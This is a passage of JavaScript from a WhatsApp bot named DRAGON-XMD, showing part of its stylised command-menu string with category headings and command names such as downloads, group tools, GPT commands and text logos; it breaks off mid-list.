          }) + "\n┃✫│ 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗥𝗔𝗠 : 76𝗚𝗕 𝗼𝗳 256𝗚𝗕\n┃✫│═════════════════════\n┃✬│𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐃𝐑𝐀𝐆𝐎𝐍-𝐗𝐌𝐃 𝐂𝐌𝐃𝐒\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎┃✫│═════════════════════\n╰══──────────────────══╯\n●════ 〘 𝗦𝗨𝗣𝗣𝗢𝗥𝗧 〙═──═●\n╭══───────◇───────══╮\n┃💥│ 𝗦𝘂𝗽𝗽𝗼𝗿𝘁\n╰══───────◇───────══╯\n●════ 〘 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗 𝐂𝐌𝐃𝐒 〙═──═●\n╭══───────◇───────══╮\n┃💥│ 𝗩𝗶𝗱𝗲𝗼\n┃💥│ 𝗣𝗹𝗮𝘆\n┃💥│ 𝗣𝗹𝗮𝘆2\n┃💥│ 𝗦𝗼𝗻𝗴\n┃💥│ 𝗦𝗼𝗻𝗴2\n┃💥│ 𝗙𝗯𝗱𝗹\n┃💥│ 𝗧𝗶𝗸𝘁𝗼𝗸\n┃💥│ 𝗧𝘄𝗶𝘁𝘁𝗲𝗿\n┃💥│ 𝗧𝘄𝘁𝗱𝗹\n┃💥│ 𝗜𝗴𝗱𝗹\n┃💥│ 𝗜𝗴\n┃💥│ 𝗙𝗯𝗱𝗹\n┃💥│ 𝗙𝗯\n┃💥│ 𝗶𝗻𝘀𝘁𝗮𝗴𝗿𝗮𝗺\n┃💥│ 𝗠𝗼𝘃𝗶𝗲\n┃💥│ 𝗟𝘆𝗿𝗶𝗰𝘀\n┃💥│ 𝗪𝗵𝗮𝘁𝘀𝗼𝗻𝗴\n┃💥│ 𝗬𝘁𝘀\n┃💥│ 𝗬𝘁𝗺𝗽3\n┃💥│ 𝗬𝘁𝗺𝗽4\n╰══───────◇───────══╯\n●═════  〘 𝗘𝗗𝗜𝗧 𝐂𝐌𝐃𝐒 〙══───═●\n╭══───────◇───────══╮\n┃💥│ 𝗦𝘁𝗶𝗰𝗸𝗲𝗿\n┃💥│ 𝗦𝗺𝗲𝗺𝗲\n┃💥│ 𝗣𝗵𝗼𝘁𝗼\n┃💥│ 𝗠𝗽4\n┃💥│ 𝗥𝗲𝘁𝗿𝗶𝗲𝘃𝗲\n┃💥│ 𝗩𝘃\n┃💥│ 𝗩𝘃2\n┃💥│ 𝐖𝐚𝐡\n┃💥│ 𝗦𝗰𝗿𝗲𝗲𝗻𝘀𝗵𝗼𝘁\n┃💥│ 𝗠𝗶𝘅\n┃💥│ 𝗧𝗮𝗸𝗲\n┃💥│ 𝗧𝘄𝗲𝗲𝘁\n┃💥│ 𝗤𝘂𝗼𝘁𝗲𝗹𝘆\n╰══───────◇───────══╯\n●═══〘 𝗖𝗢𝗡𝗙𝗜𝗚 𝗩𝗔𝗥𝗦 𝐂𝐌𝐃𝐒 〙═───═●\n╭══───────◇───────══╮\n┃💥│ 𝗔𝗻𝘁𝗶𝗱𝗲𝗹𝗲𝘁𝗲\n┃💥│ 𝗔𝗻𝘁𝗶𝗰𝗮𝗹𝗹\n┃💥│ 𝗔𝗻𝘁𝗶𝗳𝗼𝗿𝗲𝗶𝗴𝗻\n┃💥│ 𝗔𝗻𝘁𝗶𝘁𝗮𝗴\n┃💥│ 𝗔𝗻𝘁𝗶𝗹𝗶𝗻𝗸\n┃💥│ 𝗔𝗻𝘁𝗶𝗹𝗶𝗻𝗸_𝗮𝗹𝗹\n┃💥│ 𝗚𝗽𝘁_𝗜𝗻𝗯𝗼𝘅\n╰══───────◇───────══╯\n●═════  〘 𝗚𝗣𝗧 𝐂𝐌𝐃𝐒 〙═────═●\n╭══───────◇───────══╮\n┃💥│ 𝗔𝗶\n┃💥│ 𝗔𝗶2\n┃💥│ 𝗩𝗶𝘀𝗶𝗼𝗻\n┃💥│ 𝗗𝗲𝗳𝗶𝗻𝗲\n┃💥│ 𝗗𝗮𝗿𝗸𝗴𝗽𝘁\n┃💥│ 𝗪𝗶𝗻𝘅𝗲𝘆\n┃💥│ 𝗚𝗲𝗺𝗶𝗻𝗶\n┃💥│ 𝗚𝗼𝗼𝗴𝗹𝗲\n┃💥│ 𝗚𝗽𝘁\n┃💥│ 𝗚𝗽𝘁2\n┃💥│ 𝗚𝗽𝘁3\n╰══───────◇───────══╯\n●════  〘 𝗚𝗥𝗢𝗨𝗣 𝐂𝐌𝐃𝐒 〙═───═●\n╭══───────◇───────══╮\n┃💥│ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲\n┃💥│ 𝗥𝗲𝗷𝗲𝗰𝘁\n┃💥│ 𝗣𝗿𝗼𝗺𝗼𝘁𝗲\n┃💥│ 𝗗𝗲𝗺𝗼𝘁𝗲\n┃💥│ 𝗗𝗲𝗹𝗲𝘁𝗲\n┃💥│ 𝗥𝗲𝗺𝗼𝘃𝗲\n┃💥│ 𝗙𝗮𝗸𝗲𝗿\n┃💥│ 𝗙𝗼𝗿𝗲𝗶𝗴𝗻𝗲𝗿𝘀\n┃💥│ 𝗖𝗹𝗼𝘀𝗲\n┃💥│ 𝗢𝗽𝗲𝗻\n┃💥│ 𝗖𝗹𝗼𝘀𝗲𝗧𝗶𝗺𝗲\n┃💥│ 𝗢𝗽𝗲𝗻𝗧𝗶𝗺𝗲\n┃💥│ 𝗗𝗶𝘀𝗽-𝗼𝗳𝗳\n┃💥│ 𝗗𝗶𝘀𝗽-1\n┃💥│ 𝗗𝗶𝘀𝗽-7\n┃💥│ 𝗗𝗶𝘀𝗽-90\n┃💥│ 𝗜𝗰𝗼𝗻\n┃💥│ 𝗚𝗰𝗽𝗿𝗼𝗳𝗶𝗹𝗲\n┃💥│ 𝗦𝘂𝗯𝗷𝗲𝗰𝘁\n┃💥│ 𝗗𝗲𝘀𝗰\n┃💥│ 𝗟𝗲𝗮𝘃𝗲\n┃💥│ 𝗔𝗱𝗱\n┃💥│ 𝗧𝗮𝗴𝗮𝗹𝗹\n┃💥│ 𝗛𝗶𝗱𝗲𝘁𝗮𝗴\n┃💥│ 𝗥𝗲𝘃𝗼𝗸𝗲\n┃💥│ 𝗠𝘂𝘁𝗲\n┃💥│ 𝗨𝗻𝗺𝘂𝘁𝗲\n┃💥│ 𝗚𝗿𝗼𝘂𝗽𝗽𝗶𝗰\n╰══───────◇───────══╯\n●═══  〘 𝗖𝗢𝗗𝗜𝗡𝗚 𝐂𝐌𝐃𝐒 〙 ═───═●\n╭══───────◇───────══╮\n┃💥│ 𝗖𝗮𝗿𝗯𝗼𝗻\n┃💥│ 𝗖𝗼𝗺𝗽𝗶𝗹𝗲-𝗰\n┃💥│ 𝗖𝗼𝗺𝗽𝗶𝗹𝗲-𝗰++\n┃💥│ 𝗖𝗼𝗺𝗽𝗶𝗹𝗲-𝗷𝘀\n┃💥│ 𝗖𝗼𝗺𝗽𝗶𝗹𝗲-𝗽𝘆\n┃💥│ 𝗜𝗻𝘀𝗽𝗲𝗰𝘁\n┃💥│ 𝗘𝗻𝗰𝗿𝘆𝗽𝘁𝗲\n┃💥│ 𝗘𝘃𝗮𝗹\n╰══───────◇───────══╯\n●═══  〘 𝗚𝗘𝗡𝗘𝗥𝗔𝗟 𝐂𝐌𝐃𝐒 〙 ═───═●\n╭══───────◇───────══╮\n┃💥│ 𝗢𝘄𝗻𝗲𝗿\n┃💥│ 𝗦𝗰𝗿𝗶𝗽𝘁\n┃💥│ 𝗦𝗰\n┃💥│ 𝗟𝗶𝘀𝘁\n┃💥│ 𝗣𝗶𝗻𝗴\n┃💥│ 𝗣𝗼𝗹𝗹\n┃💥│ 𝗔𝗹𝗶𝘃𝗲\n┃💥│ 𝗦𝗽𝗲𝗲𝗱\n┃💥│ 𝗥𝗲𝗽𝗼\n┃💥│ 𝗥𝘂𝗻𝘁𝗶𝗺𝗲\n┃💥│ 𝗨𝗽𝘁𝗶𝗺𝗲\n┃💥│ 𝗗𝗽\n┃💥│ 𝗗𝗹𝘁\n┃💥│ 𝗠𝗮𝗶𝗹\n┃💥│ 𝗜𝗻𝗯𝗼𝘅\n┃💥│ 𝗡𝗲𝘄𝘀\n┃💥│ 𝗔𝗻𝗶𝗺𝗲\n╰══───────◇───────══╯\n●═══   〘 𝗢𝗪𝗡𝗘𝗥 𝐂𝐌𝐃𝐒  〙═───═●\n╭══───────◇───────══╮\n┃💥│ 𝗥𝗲𝘀𝘁𝗮𝗿𝘁\n┃💥│ 𝗔𝗱𝗺𝗶𝗻\n┃💥│ 𝗖𝗮𝘀𝘁\n┃💥│ 𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁\n┃💥│ 𝗝𝗼𝗶𝗻\n┃💥│ 𝗚𝗲𝘁𝘃𝗮𝗿\n┃💥│ 𝗥𝗲𝗱𝗲𝗽𝗹𝗼𝘆\n┃💥│ 𝗨𝗽𝗱𝗮𝘁𝗲\n┃💥│ 𝗦𝗲𝘁𝘃𝗮𝗿\n┃💥│ 𝗕𝗼𝘁𝗽𝗽\n┃💥│ 𝗙𝘂𝗹𝗹𝗽𝗽\n┃💥│ 𝗕𝗹𝗼𝗰𝗸\n┃💥│ 𝗨𝗻𝗯𝗼𝗰𝗸\n┃💥│ 𝗞𝗶𝗹𝗹\n┃💥│ 𝗞𝗶𝗹𝗹2\n┃💥│ 𝗧𝗲𝗿𝗺𝗶𝗻𝗮𝘁𝗲\n┃💥│ 𝗦𝗮𝘃𝗲\n┃💥│ >\n┃💥│ 𝗧𝗲𝗺𝗽𝗲𝗺𝗮𝗶𝗹\n╰══───────◇───────══╯\n●═══   〘 𝗣𝗥𝗔𝗡𝗞 𝐂𝐌𝐃  〙 ═──═●\n╭══───────◇───────══╮\n┃💥│ 𝗛𝗮𝗰𝗸\n┃💥│ 𝗩𝗶𝗿𝘂𝘀𝗵𝗮𝗰𝗸\n╰══───────◇───────══╯\n●═══ 〘 𝗘𝗡𝗧𝗘𝗥𝗧𝗔𝗜𝗡𝗠𝗘𝗡𝗧 〙 ═──═●\n╭══───────◇───────══╮\n┃💥│ 𝗩𝗶𝗿𝗴𝗶𝗻𝗶𝘁𝘆𝘁𝗲𝘀𝘁\n┃💥│ 𝗩𝗶𝗿𝗴𝗶𝗻𝗶𝘁𝘆𝗿𝗮𝘁𝗲\n┃💥│ 𝗙𝗼𝗼𝗹𝘁𝗲𝘀𝘁\n┃💥│ 𝗙𝗼𝗼𝗹𝗿𝗮𝘁𝗲\n┃💥│ 𝗛𝗼𝗿𝗻𝘆𝘁𝗲𝘀𝘁\n┃💥│ 𝗖𝗵𝗲𝗰𝗸𝗺𝗲\n┃💥│ 𝗖𝗵𝗲𝗰𝗸𝗮𝗹𝗹\n╰══───────◇───────══╯\n●═══   〘 𝗟𝗢𝗚𝗢𝗦 𝐂𝐌𝐃𝐒 〙 ═──═●\n╭══───────◇───────══╮\n┃💥│ 𝗛𝗮𝗰𝗸𝗲𝗿\n┃💥│ 𝗛𝗮𝗰𝗸𝗲𝗿2\n┃💥│ 𝗚𝗿𝗮𝗳𝗳𝗶𝘁𝗶\n┃💥│ 𝗖𝗮𝘁\n┃💥│ 𝗦𝗮𝗻𝗱\n┃💥│ 𝗚𝗼𝗹𝗱\n┃💥│ 𝗔𝗿𝗲𝗻𝗮\n┃💥│ 𝗗𝗿𝗮𝗴𝗼𝗻𝗯𝗮𝗹𝗹\n┃💥│ 𝗡𝗮𝗿𝘂𝘁𝗼\n┃💥│ 𝗖𝗵𝗶𝗹𝗱\n┃💥│ 𝗟𝗲𝗮𝘃𝗲𝘀\n┃💥│ 1917\n┃💥│ 𝗧𝘆𝗽𝗼𝗴𝗿𝗮𝗽𝗵𝘆\n╰══───────◇───────══╯\n●═══ 〘  𝗧𝗘𝗫𝗧𝗠𝗔𝗞𝗘𝗥 𝐂𝐌𝐃𝐒  〙═──═●\n╭══───────◇───────══╮\n┃💥│ 𝗣𝘂𝗿𝗽𝗹𝗲\n┃💥│ 𝗡𝗲𝗼𝗻\n┃💥│ 𝗡𝗼𝗲𝗹\n┃💥│ 𝗠𝗲𝘁𝗮𝗹𝗹𝗶𝗰\n┃💥│ 𝗗𝗲𝘃𝗶𝗹\n┃💥│ 𝗜𝗺𝗽𝗿𝗲𝘀𝘀𝗶𝘃𝗲\n┃💥│ 𝗦𝗻𝗼𝘄\n┃💥│ 𝗪𝗮𝘁𝗲𝗿\n┃💥│ 𝗧𝗵𝘂𝗻𝗱𝗲𝗿\n┃💥│ 𝗜𝗰𝗲\n┃💥│ 𝗠𝗮𝘁𝗿𝗶𝘅\n┃💥│ 𝗦𝗶𝗹𝘃𝗲𝗿\n┃💥│ 𝗟𝗶𝗴𝗵𝘁\n╰══───────◇───────══╯\n●═══   〘 𝗠𝗜𝗦𝗖 𝐂𝐌𝐃 〙 ═──═●\n╭══───────◇───────══╮\n┃💥│ 𝗪𝗲𝗮𝘁𝗵𝗲𝗿\n┃💥│ 𝗚𝗶𝘁𝗵𝘂𝗯\n┃💥│ 𝗚𝗶𝘁𝗰𝗹𝗼𝗻𝗲\n┃💥│ 𝗔𝗱𝘃𝗶𝗰𝗲\n┃💥│ 𝗥𝗲𝗺𝗼𝘃𝗲𝗯𝗴\n┃💥│ 𝗥𝗲𝗺𝗶𝗻𝗶\n┃💥│ 𝗧𝘁𝘀\n┃💥│ 𝗧𝗿𝘁\n┃💥│ 𝗙𝗮𝗰𝘁\n┃💥│ 𝗖𝗮𝘁𝗳𝗮𝗰𝘁\n┃💥│ 𝗤𝘂𝗼𝘁𝗲𝘀\n┃💥│ 𝗣𝗶𝗰𝗸𝘂𝗽𝗹𝗶𝗻𝗲\n╰══───────◇───────══╯\n●═══  〘 𝗢𝗧𝗛𝗘𝗥𝗦 𝐂𝐌𝐃𝐒 〙 ═──═●\n╭══───────◇───────══╮\n┃💥│ 𝗖𝗿𝗲𝗱𝗶𝘁𝘀\n┃💥│ 𝗨𝗽𝗹𝗼𝗮𝗱\n┃💥│ 𝗔𝘁𝘁𝗽\n┃💥│ 𝗨𝗿𝗹\n┃💥│ 